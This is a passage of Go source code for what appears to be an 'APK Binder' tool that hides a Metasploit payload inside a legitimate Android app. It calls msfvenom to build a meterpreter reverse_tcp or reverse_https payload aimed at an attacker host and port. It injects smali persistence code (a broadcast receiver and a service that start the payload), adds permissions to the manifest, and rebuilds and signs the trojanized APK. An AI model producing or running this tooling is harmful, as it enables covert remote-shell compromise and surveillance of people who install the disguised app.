    os.MkdirAll(filepath.Dir(receiverPath), 0755)

    receiverSmali := `.class public Lcom/metasploit/stage/PersistenceReceiver;
.super Landroid/content/BroadcastReceiver;
.source "PersistenceReceiver.java"

.method public constructor <init>()V
    .locals 0

    invoke-direct {p0}, Landroid/content/BroadcastReceiver;-><init>()V

    return-void
.end method

.method public onReceive(Landroid/content/Context;Landroid/content/Intent;)V
    .locals 1

    const-string v0, "PersistenceReceiver"
    const-string v1, "Starting payload from persistence receiver"
    invoke-static {v0, v1}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    invoke-static {p1}, Lcom/metasploit/stage/Payload;->start(Landroid/content/Context;)V

    return-void
.end method
`

    err := ioutil.WriteFile(receiverPath, []byte(receiverSmali), 0644)
    if err != nil {
        log.Fatalf("[!] Failed to create persistence receiver: %v", err)
    }

    // Add a service for better persistence
    serviceName := "com.metasploit.stage.PersistenceService"
    manifest.Application.Services = append(manifest.Application.Services, Service{
        Name:     serviceName,
        Exported: "false",
    })

    servicePath := fmt.Sprintf("./tmp/original/smali/%s.smali", strings.Replace(serviceName, ".", "/", -1))
    os.MkdirAll(filepath.Dir(servicePath), 0755)

    serviceSmali := `.class public Lcom/metasploit/stage/PersistenceService;
.super Landroid/app/Service;
.source "PersistenceService.java"

.method public constructor <init>()V
    .locals 0

    invoke-direct {p0}, Landroid/app/Service;-><init>()V

    return-void
.end method

.method public onBind(Landroid/content/Intent;)Landroid/os/IBinder;
    .locals 1

    const/4 v0, 0x0

    return-object v0
.end method

.method public onStartCommand(Landroid/content/Intent;II)I
    .locals 2

    const-string v0, "PersistenceService"
    const-string v1, "Starting persistence service"
    invoke-static {v0, v1}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    invoke-static {p0}, Lcom/metasploit/stage/Payload;->start(Landroid/content/Context;)V

    const/4 v0, 0x1

    return v0
.end method
`

    err = ioutil.WriteFile(servicePath, []byte(serviceSmali), 0644)
    if err != nil {
        log.Fatalf("[!] Failed to create persistence service: %v", err)
    }

    fmt.Println("[+] Added persistence components (receiver and service)")
}

func updateManifest(manifest *AndroidManifest, debug bool) {
    fmt.Println("[*] Updating AndroidManifest.xml")

    // Read original manifest content
    manifestXML, err := ioutil.ReadFile("./tmp/original/AndroidManifest.xml")
    if err != nil {
        log.Fatalf("[!] Failed to read manifest: %v", err)
    }

    manifestStr := string(manifestXML)
    manifestEnd := strings.Index(manifestStr, "</manifest>")
    if manifestEnd == -1 {
        log.Fatal("[!] Could not find </manifest> tag")
    }

    // Build permissions and features string
    var additionsBuilder strings.Builder

    // Add all required permissions
    for _, perm := range PERMISSIONS {
        if !strings.Contains(manifestStr, perm) {
            additionsBuilder.WriteString(fmt.Sprintf("<uses-permission android:name=\"%s\"/>\n", perm))
        }
    }

    // Add all required features
    for _, feat := range FEATURES {
        if !strings.Contains(manifestStr, feat) {
            additionsBuilder.WriteString(fmt.Sprintf("<uses-feature android:name=\"%s\"/>\n", feat))
        }
    }

    // Add debug information if enabled
    if debug {
        additionsBuilder.WriteString("<!-- Injected by APK Binder -->\n")
    }

    // Insert new content before </manifest>
    newManifest := manifestStr[:manifestEnd] + "\n" + additionsBuilder.String() + manifestStr[manifestEnd:]

    // Write updated manifest
    err = ioutil.WriteFile("./tmp/original/AndroidManifest.xml", []byte(newManifest), 0644)
    if err != nil {
        log.Fatalf("[!] Failed to update manifest: %v", err)
    }

    fmt.Println("[+] Updated AndroidManifest.xml with permissions and features")
}

func generatePayload(lhost, lport string, https bool, delay int, persist bool) {
    fmt.Println("\n[+] Generating Metasploit payload")

    payloadType := "android/meterpreter/reverse_tcp"
    if https {
        payloadType = "android/meterpreter/reverse_https"
    }

    args := []string{
        "-p", payloadType,
        "LHOST=" + lhost,
        "LPORT=" + lport,
        "-o", PAYLOAD_APK,
    }

    if delay > 0 {
        args = append(args, fmt.Sprintf("AndroidWakelockTime=%d", delay))
    }

    if persist {
        args = append(args, "AndroidServiceMaintainPersistance=true")
    }

    runCommand("msfvenom", args...)

    if _, err := os.Stat(PAYLOAD_APK); err != nil {
        log.Fatalf("[!] Payload generation failed: %v", err)
    }

    fmt.Printf("[+] Payload generated: %s\n", PAYLOAD_APK)
}

func decompileAPK(apkPath, outputDir string, debug bool) {
    fmt.Printf("\n[+] Decompiling %s\n", apkPath)
    args := []string{"d", "-f", "-o", outputDir, apkPath}
    if debug {
        args = append(args, "-v")
    }
    runCommand("apktool", args...)
}

func parseManifest(manifestPath string) (*AndroidManifest, error) {
    file, err := os.Open(manifestPath)
    if err != nil {
        return nil, err
    }
    defer file.Close()

    data, err := ioutil.ReadAll(file)
    if err != nil {
        return nil, err
    }

    // Clean up XML namespace declarations
    cleaned := regexp.MustCompile(`xmlns:android="[^"]+"`).ReplaceAll(data, []byte{})
    cleaned = regexp.MustCompile(`android:`).ReplaceAll(cleaned, []byte{})

    var manifest AndroidManifest
    err = xml.Unmarshal(cleaned, &manifest)
    if err != nil {
        return nil, err
    }

    return &manifest, nil
}

func rebuildAPK(sourceDir, outputFile string, debug bool) {
    fmt.Printf("\n[+] Rebuilding APK from %s\n", sourceDir)
    args := []string{"b", sourceDir, "-o", outputFile}
    if debug {
        args = append(args, "-v")
    }
    runCommand("apktool", args...)
}

func signAPK(apkPath, keystorePass string, debug bool) {
    fmt.Println("\n[+] Signing APK")

    // First create keystore if it doesn't exist
    if _, err := os.Stat(KEYSTORE_PATH); os.IsNotExist(err) {
        fmt.Println("[*] Creating new keystore")
        runCommand("keytool", "-genkeypair",
            "-alias", KEY_ALIAS,
            "-keyalg", "RSA",
            "-keysize", "2048",
            "-validity", "10000",
            "-keystore", KEYSTORE_PATH,
            "-storepass", keystorePass,
            "-keypass", keystorePass,
            "-dname", "CN=Android, OU=Development, O=Android, L=Internet, ST=World, C=00",
        )
    }

    // Sign the APK
    runCommand("jarsigner", 
        "-keystore", KEYSTORE_PATH,
        "-storepass", keystorePass,
        "-keypass", keystorePass,
        apkPath,
        KEY_ALIAS)

    fmt.Println("[+] APK signed successfully")
}

func getPayloadName(https bool) string {
    if https {
        return "android/meterpreter/reverse_https"
    }
    return "android/meterpreter/reverse_tcp"
}

func runCommand(name string, args ...string) {
    if debugMode {
        fmt.Printf("    Executing: %s %v\n", name, args)
    }
    cmd := exec.Command(name, args...)
    cmd.Stdout = os.Stdout
    cmd.Stderr = os.Stderr
    if err := cmd.Run(); err != nil {
        log.Fatalf("[!] Command failed: %v", err)
    }
}

func promptYesNo(prompt string) bool {
    reader := bufio.NewReader(os.Stdin)
    for {
        fmt.Printf("%s [y/n]: ", prompt)
        answer, _ := reader.ReadString('\n')
        answer = strings.TrimSpace(strings.ToLower(answer))
        if answer == "y" || answer == "yes" {
            return true
        } else if answer == "n" || answer == "no" {
            return false
        }
    }
}

func cleanup() {
    fmt.Println("\n[+] Cleaning up temporary files")
    os.RemoveAll("./tmp")
    os.Remove(PAYLOAD_APK)
}

func contains(slice []string, item string) bool {
    for _, s := range slice {
        if s == item {
            return true
        }
    }
    return false
}

func copyDir(src, dst string) error {
    return filepath.Walk(src, func(path string, info os.FileInfo, err error) error {
        if err != nil {
            return err
        }

        relPath := strings.TrimPrefix(path, src)
        targetPath := filepath.Join(dst, relPath)

        if info.IsDir() {
            return os.MkdirAll(targetPath, info.Mode())
        }

        data, err := ioutil.ReadFile(path)
        if err != nil {
            return err
        }

        return ioutil.WriteFile(targetPath, data, info.Mode())
    })
}


var debugMode bool

func init() {
    flag.BoolVar(&debugMode, "debug", false, "Enable debug mode")
}
